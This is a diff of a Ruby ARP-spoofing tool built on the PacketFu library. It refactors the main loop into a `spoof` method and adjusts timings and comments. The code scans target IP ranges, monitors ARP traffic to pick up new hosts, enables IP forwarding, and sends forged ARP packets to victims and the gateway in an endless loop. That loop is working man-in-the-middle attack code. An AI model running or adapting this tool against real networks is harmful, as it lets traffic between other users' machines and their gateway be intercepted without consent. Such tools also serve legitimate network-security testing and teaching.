@@ -47,7 +47,7 @@ def target_parse(target)
     to    = range[/\A(\w*.){3}/] + range.split("-")[1]  
     ip_from   = IPAddr.new(from)
     ip_to     = IPAddr.new(to)
-    (ip_from..ip_to).each { |ip| @target << ip.to_s }   # Enter each value of range into @target
+    (ip_from..ip_to).each { |ip| @target << ip.to_s }    # Enter each value of range into @target
   end
 rescue
   puts "\n!!! Invalid target #{target} !!!"
@@ -82,10 +82,10 @@ def target_scanner(targets, timeout)
         end
         GC.start
       end
-      sleep 0.07 # Absolutely crucial
+      sleep 0.1     # Absolutely crucial to sleep, but you can fine-tune this value
     end
     threads.each { |thread| thread.join }          # Wait for all the child processes to finish
-  else # TODO: How to DRY out?
+  else              # TODO: How to DRY out?
     targets.each do |ip|
       @targets_hash[ip] = PacketFu::Utils::arp(ip, :timeout => timeout, :iface => @iface)
       if @targets_hash[ip]
@@ -128,16 +128,14 @@ def arp_monitor
       if in_scope?(ipaddr) && ipaddr != @defaults[:ip_saddr] && !@targets_hash.include?(ipaddr) && ipaddr != @gateway
         if arp_pkt.arp_opcode == 1
           macaddr = PacketFu::Utils::arp(ipaddr, :timeout => 6, :iface => @iface)
-          5.times do
-            sleep 1 unless macaddr # FIXME: a better way of waiting
-          end
+          6.times { sleep 1 unless macaddr }    # FIXME: a better way of blocking
           @new_targets[ipaddr] = macaddr
         elsif arp_pkt.arp_opcode == 2
           @new_targets[ipaddr] = arp_pkt.arp_saddr_mac = macaddr
         end
         if macaddr
           puts_verbose("\nNew target arrived; #{ipaddr} ")
-          make_packet_array(@new_targets)  # makes additional spoof packets for any new targets
+          make_packet_array(@new_targets)       # makes additional spoof packets for any new targets
         end
       end
     end
@@ -148,9 +146,33 @@ def in_scope?(ip)
   @target.include?(ip)
 end
 
+def spoof
+  `echo 1 > /proc/sys/net/ipv4/ip_forward`
+  puts "\n\nSending spoofing packets to: "
+  @targets_hash.each { |ip, _| print "#{ip}; " }
+  print "and gateway #{@gateway}" if @two_way
+  print_verbose "\nPackets sent: "
+  count = 0
+  while true
+    @target_packets.each do |pkt|
+      pkt.to_w(@iface)
+      count += 1
+    end
+    if @two_way
+      @gateway_packets.each do |pkt|
+        pkt.to_w(@iface)
+        count += 1
+      end
+    end
+    GC.start   # to deal with "memory leak" (more likely a problem in calling the GC)
+    print_verbose "#{count}, "
+    sleep 4
+  end
+end
+
 def neat_exit
   if @send_packets
-    puts "\nRe-ARPing the network..."
+    puts "\n\nRe-ARPing the network..."
     @send_packets = false # Stop sending spoofed packets
     re_arp_pkts = []
     @targets_hash.each do |target, target_mac|
@@ -234,7 +256,7 @@ if interactive
     temp = gets.chomp
     unless temp.empty?
       @iface = temp
-      @defaults = PacketFu::Utils.ifconfig(@iface)               # Iface changed, therefore need new defaults
+      @defaults = PacketFu::Utils.ifconfig(@iface)             # Iface changed, therefore need new defaults
     end
   rescue ArgumentError
     puts "!!! Invalid interface. Start again !!!"
@@ -244,7 +266,7 @@ if interactive
 
   until ip_check(@gateway) do
     net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ }  # Find gateway by parsing netstat
-    @gateway = ((net[0]).split)[1] 
+    @gateway = net.first.split[1] 
     if ip_check(@gateway)
       print "Gateway appears to be #{@gateway}.\nEnter to accept, or type an alternative IP: "
     else
@@ -304,7 +326,7 @@ else
   unless @gateway
     @two_way = false
     net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ } # Find gateway by parsing netstat
-    @gateway = ((net[0]).split)[1]
+    @gateway = net.first.split[1]
   end 
   unless ip_check(@gateway)
     print "Unable to verify gateway address. Try again with 2-way spoofing, or interactive mode."
@@ -335,9 +357,7 @@ puts "\nSpoofing #{var3} on #{@iface}, #{var2}"
 
 puts_verbose("\nLooking for gateway...")
 @gateway_mac = PacketFu::Utils::arp(@gateway, :timeout => 6, :iface => @iface)
-6.times do
- sleep 1 unless @gateway_mac # FIXME: a better way of waiting for gateway response
-end
+6.times { sleep 1 unless @gateway_mac } # FIXME: a better way of waiting for gateway response
 if @gateway_mac
   puts_verbose "#{@gateway} \tmac is #{@gateway_mac} (Gateway)"
 else
@@ -350,28 +370,5 @@ target_parse(target)
 target_scanner(@target, 4)
 make_packet_array(@targets_hash)
 arp_monitor
-
-`echo 1 > /proc/sys/net/ipv4/ip_forward`
 @send_packets = true
-while @send_packets
-  puts "\n\nSending spoofing packets to"
-  @targets_hash.each { |ip, _| print "; #{ip}" }
-  print " and gateway #{@gateway}" if @two_way
-  print_verbose "\nPackets sent: "
-  count = 0
-  while true
-    @target_packets.each do |pkt|
-      pkt.to_w(@iface)
-      count += 1
-    end
-    if @two_way
-      @gateway_packets.each do |pkt|
-        pkt.to_w(@iface)
-        count += 1
-      end
-    end
-    GC.start   # to deal with "memory leak" (more likely a problem in calling the GC)
-    print_verbose "#{count}, "
-    sleep 4
-  end
-end
+spoof while @send_packets
